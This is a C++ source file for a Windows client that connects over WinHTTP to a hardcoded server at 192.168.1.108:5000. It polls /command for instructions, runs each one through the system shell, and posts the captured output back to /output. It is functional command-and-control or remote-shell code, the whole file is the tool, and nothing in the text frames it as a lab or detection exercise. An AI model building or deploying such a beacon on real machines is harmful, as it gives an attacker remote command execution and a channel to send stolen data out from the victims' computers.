#include <windows.h>
#include <winhttp.h>
#include <string>
#include <iostream>
#include <vector>
#include <cstdio>  // Add this for _popen

// For MinGW compilation - manually link against winhttp
#ifdef __MINGW32__
#pragma comment(lib, "winhttp")
#endif

// Function to read all available data from an HTTP response
bool ReadAll(HINTERNET hRequest, std::string &out)
{
    out.clear(); // Clear output string

    // Loop until all data is read
    for (;;)
    {
        DWORD available = 0;
        // Check how much data is available to read
        if (!WinHttpQueryDataAvailable(hRequest, &available))
            return false;
        if (available == 0)
            break; // No more data, exit loop

        // Create buffer for the available data
        std::vector<char> buf(available);
        DWORD read = 0;

        // Read the available data into buffer
        if (!WinHttpReadData(hRequest, buf.data(), available, &read))
            return false;

        // Append read data to output string
        out.append(buf.data(), buf.data() + read);
    }
    return true;
}

// Function to perform HTTP GET request and retrieve JSON response
bool HttpGetJson(HINTERNET hConnect, const wchar_t *path, std::string &body)
{
    // Open HTTP request for GET method
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
        return false;

    bool ok = false;
    // Send the request and receive response
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL))
    {
        // Read all response data
        ok = ReadAll(hRequest, body);
    }

    // Clean up request handle
    WinHttpCloseHandle(hRequest);
    return ok;
}

// Function to perform HTTP POST request with JSON body
bool HttpPostJson(HINTERNET hConnect, const wchar_t *path, const std::string &jsonBody)
{
    // Open HTTP request for POST method
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
        return false;

    // Set Content-Type header for JSON
    std::wstring headers = L"Content-Type: application/json\r\n";

    // Send request with headers and JSON body
    BOOL sent = WinHttpSendRequest(hRequest,
                                   headers.c_str(), (DWORD)headers.size(),
                                   (LPVOID)jsonBody.data(), (DWORD)jsonBody.size(),
                                   (DWORD)jsonBody.size(), 0);

    bool ok = false;
    // If sent successfully, receive and read response (though we ignore it)
    if (sent && WinHttpReceiveResponse(hRequest, NULL))
    {
        std::string resp;
        ok = ReadAll(hRequest, resp);
        (void)resp; // Explicitly ignore the response
    }

    // Clean up request handle
    WinHttpCloseHandle(hRequest);
    return ok;
}

// Function to execute a system command and capture its output
std::string ExecuteCommand(const std::string &command)
{
    std::string result;

    // Open a pipe to execute the command and read output
    FILE *pipe = _popen(command.c_str(), "r");
    if (!pipe)
    {
        return "ERROR: Failed to execute command";
    }

    // Read command output line by line
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }

    // Close pipe and get exit code
    int exitCode = _pclose(pipe);

    // If command failed and produced no output, return error message
    if (exitCode != 0 && result.empty())
    {
        result = "ERROR: Command failed with exit code " + std::to_string(exitCode);
    }

    return result;
}

// Function to escape special characters for JSON format
std::string JsonEscape(const std::string &str)
{
    std::string escaped;

    // Process each character in the input string
    for (char c : str)
    {
        switch (c)
        {
        case '\\':
            escaped += "\\\\";
            break; // Escape backslash
        case '\"':
            escaped += "\\\"";
            break; // Escape double quote
        case '\b':
            escaped += "\\b";
            break; // Escape backspace
        case '\f':
            escaped += "\\f";
            break; // Escape form feed
        case '\n':
            escaped += "\\n";
            break; // Escape newline
        case '\r':
            escaped += "\\r";
            break; // Escape carriage return
        case '\t':
            escaped += "\\t";
            break; // Escape tab
        default:
            // Escape control characters using Unicode notation
            if (c < 0x20)
            {
                char buf[8];
                sprintf_s(buf, "\\u%04x", (unsigned char)c);
                escaped += buf;
            }
            else
            {
                escaped += c; // Regular character, no escaping needed
            }
        }
    }
    return escaped;
}

// Function to extract command from JSON response
std::string ExtractCommand(const std::string &json)
{
    // Find the "command" key in JSON
    size_t pos = json.find("\"command\"");
    if (pos == std::string::npos)
        return "";

    // Find the opening quote of the command value
    pos = json.find("\"", pos + 9);
    if (pos == std::string::npos)
        return "";

    // Find the closing quote of the command value
    size_t end = json.find("\"", pos + 1);
    if (end == std::string::npos)
        return "";

    // Extract and return the command string
    return json.substr(pos + 1, end - pos - 1);
}

// For MinGW compatibility - use main instead of wmain
#ifdef __MINGW32__
int main()
#else
int wmain()
#endif
{
    // Initialize WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Command Client/1.0",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
    {
        std::wcerr << L"WinHttpOpen failed\n";
        return 1;
    }

    // Connect to the command server (hardcoded IP and port)
    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.108", 5000, 0);
    if (!hConnect)
    {
        std::wcerr << L"WinHttpConnect failed\n";
        WinHttpCloseHandle(hSession);
        return 1;
    }

    std::cout << "Connected to server. Waiting for commands...\n";

    // Main command loop
    while (true)
    {
        std::string cmdBody;

        // Poll server for new commands
        if (!HttpGetJson(hConnect, L"/command", cmdBody))
        {
            std::wcerr << L"GET /command failed\n";
            Sleep(5000); // Wait 5 seconds before retrying
            continue;
        }

        // Extract command from JSON response
        std::string command = ExtractCommand(cmdBody);
        if (command.empty())
        {
            Sleep(2000); // No command available, wait 2 seconds
            continue;
        }

        std::cout << "Received command: " << command << "\n";

        // Check for exit condition
        if (command == "exit" || command == "quit")
        {
            std::cout << "Exit command received. Shutting down...\n";
            break;
        }

        // Execute the command and capture output
        std::string output = ExecuteCommand(command);
        std::cout << "Command output (" << output.length() << " bytes)\n";

        // Format output as JSON and send back to server
        std::string outputJson = "{\"output\":\"" + JsonEscape(output) + "\"}";
        if (!HttpPostJson(hConnect, L"/output", outputJson))
        {
            std::wcerr << L"POST /output failed\n";
        }
        else
        {
            std::cout << "Output sent to server.\n";
        }
    }

    // Clean up HTTP handles
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}